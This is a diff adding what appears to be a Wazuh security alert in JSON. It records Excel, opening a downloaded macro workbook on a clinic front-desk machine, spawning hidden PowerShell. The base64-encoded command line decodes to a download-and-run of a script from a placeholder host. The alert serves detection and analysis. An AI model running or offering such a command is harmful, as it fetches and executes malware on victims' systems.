@@ -1,0 +1,70 @@
+{
+  "timestamp": "2026-09-17T08:52:19.204+0000",
+  "rule": {
+    "level": 12,
+    "description": "Encoded PowerShell command launched by an Office application",
+    "id": "100010",
+    "mitre": {
+      "id": [
+        "T1059.001"
+      ],
+      "tactic": [
+        "Execution"
+      ],
+      "technique": [
+        "PowerShell"
+      ]
+    },
+    "firedtimes": 1,
+    "groups": [
+      "windows",
+      "sysmon",
+      "sysmon_event1",
+      "powershell"
+    ]
+  },
+  "agent": {
+    "id": "001",
+    "name": "CLINIC-FRONT01",
+    "ip": "192.0.2.11"
+  },
+  "manager": {
+    "name": "wazuh-manager"
+  },
+  "id": "1789634339.110254",
+  "decoder": {
+    "name": "windows_eventchannel"
+  },
+  "location": "EventChannel",
+  "data": {
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "systemTime": "2026-09-17T08:52:18.6610042Z",
+        "eventRecordID": "51877",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "CLINIC-FRONT01",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "utcTime": "2026-09-17 08:52:18.661",
+        "processId": "7012",
+        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "originalFileName": "PowerShell.EXE",
+        "commandLine": "powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACcAaAB0AHQAcAA6AC8ALwBmAGkAbABlAHMALgBoAGUAbABwAGQAZQBzAGsALQB0AG8AbwBsAHMALgB0AGUAcwB0AC8AawAuAHAAcwAxACcAIAAtAE8AdQB0AEYAaQBsAGUAIAAkAGUAbgB2ADoAVABFAE0AUABcAGsALgBwAHMAMQA7ACAAJgAgACQAZQBuAHYAOgBUAEUATQBQAFwAawAuAHAAcwAxAA==",
+        "currentDirectory": "C:\\Users\\frontdesk01\\Documents\\",
+        "user": "CLINIC\\frontdesk01",
+        "integrityLevel": "Medium",
+        "parentProcessId": "6640",
+        "parentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
+        "parentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE\" \"C:\\Users\\frontdesk01\\Downloads\\remittance_0917.xlsm\""
+      }
+    }
+  }
+}
